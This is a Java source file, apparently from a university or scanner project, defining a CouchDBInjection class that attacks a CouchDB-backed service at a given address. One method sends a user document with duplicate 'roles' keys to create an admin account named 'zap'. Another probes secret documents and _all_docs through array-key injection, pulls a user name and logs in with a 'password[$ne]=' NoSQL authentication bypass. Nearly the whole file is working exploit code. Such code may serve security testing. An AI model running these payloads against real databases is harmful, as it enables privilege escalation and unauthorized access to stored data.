package it.org.polito.couchdb;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONArray;
import org.json.JSONObject;

public class CouchDBInjection {

    // IP address of the db to be attacked, including the port number (e.g. 127.0.0.1:8080)
    private String ipAddr;
    // Version number of the couch db to be attacked (different kind of attacks for different versions)
    private String version;

    // Constructor

    public CouchDBInjection(String ipAddr, String version){
        this.ipAddr = ipAddr;
        this.version = version;
    }

    // Methods

    public void injection161(String user) throws IOException {
        String body = "{\"name\": \"zap\", \"password\": \"zap\", \"roles\": [\"_admin\"], \"roles\": [], \"type\": \"user\"}";
        JSONObject res = sendPUT(ipAddr + "/insertDoc", body);

        if(res.optInt("code", -1) == 200 &&
                res.optBoolean("ok", false))
            System.out.println("\n---------- USER \"zap\" CREATED WITH ADMIN PRIVILEGES! ----------\n");
        else if(res.optString("error", "\0").compareTo("conflict") == 0)
            System.out.println("\n--------------- USER ALREADY EXISTS! ---------------\n");
        else
            System.out.println("\n---------- USER CANNOT BE CREATED WITH ADMIN PRIVILEGES! ----------\n");
    }

    public void injection311passwordBypass() throws IOException {

        boolean allDocsFlag = false;
        int code;

        /* ***************************** secretDoc ***************************** */
        JSONObject resSecretDoc = sendGET(ipAddr + "/get?key[]=secretDoc");
        if(!resSecretDoc.isEmpty()){
            code = resSecretDoc.optInt("code", -1);
            if(code == 200)
                System.out.println("\n------- SECRET DOC COMPROMISED! -------\n");
            else
                System.out.println("\n------- SECRET DOC PROTECTED! -------\n");
        }

        /* ***************************** _all_docs ***************************** */
        JSONObject resAllDoc = sendGET(ipAddr + "/get?key[]=_all_docs");
        if(!resAllDoc.isEmpty()){
            code = resAllDoc.optInt("code", -1);
            if(code == 200) {
                System.out.println("\n------- _all_docs COMPROMISED! -------\n");
                allDocsFlag = true;
            }
            else
                System.out.println("\n------- _all_docs PROTECTED! -------\n");
        }

        /* ***************************** One Key ****************************** */
        String user = "";
        if(allDocsFlag){
            JSONArray rows = new JSONArray(resAllDoc.get("rows").toString());
            JSONObject jsonKey = rows.getJSONObject(0);
            String key = jsonKey.optString("key", "");
            if(!key.equals("")) {
                JSONObject resOneKey = sendGET(ipAddr + "/get?key=" + key);
                if (!resOneKey.isEmpty()) {
                    code = resOneKey.optInt("code", -1);
                    if (code == 200)
                        user = resOneKey.optString("user", "");
                    // TODO: trovare modo per controllare tutti nomi per "user"!!!
                }
            }
            if(!user.equals("")){
                JSONObject resUser = sendGET(ipAddr + "/login?user=" + user + "&password[%24ne]=");
                code = resUser.optInt("code", -1);
                boolean result = resUser.optBoolean("login", false);
                if(code == 200 && result)
                    System.out.println("\n------------ Login for user " + user + " success --------------\n");
            }
        }
    }

    private static JSONObject sendGET(String url) throws IOException {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        int responseCode = con.getResponseCode();
        System.out.println("GET Response Code :: " + responseCode);

        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuilder response = new StringBuilder();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        // print result
        JSONObject myResponse = new JSONObject(response.toString());
        myResponse.put("code", responseCode);
        //System.out.println(myResponse.toString());

        return myResponse;

    }

    private static JSONObject sendPUT(String url, String data) throws IOException {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setDoOutput(true);
        con.setRequestMethod("PUT");
        con.setRequestProperty("Content-Type", "application/json");
        try {
            OutputStreamWriter osw = new OutputStreamWriter(con.getOutputStream());
            osw.write(data);
            osw.flush();
            osw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        int responseCode = con.getResponseCode();
        System.out.println("GET Response Code :: " + responseCode);

        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuilder response = new StringBuilder();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        // print result
        JSONObject myResponse = new JSONObject(response.toString());
        myResponse.put("code", responseCode);
        //System.out.println(myResponse.toString());

        return myResponse;

    }

    // Getters and setters

    public String getIpAddr() {
        return ipAddr;
    }

    public String getVersion() {
        return version;
    }

    public void setIpAddr(String ipAddr) {
        this.ipAddr = ipAddr;
    }

    public void setVersion(String version) {
        this.version = version;
    }
}
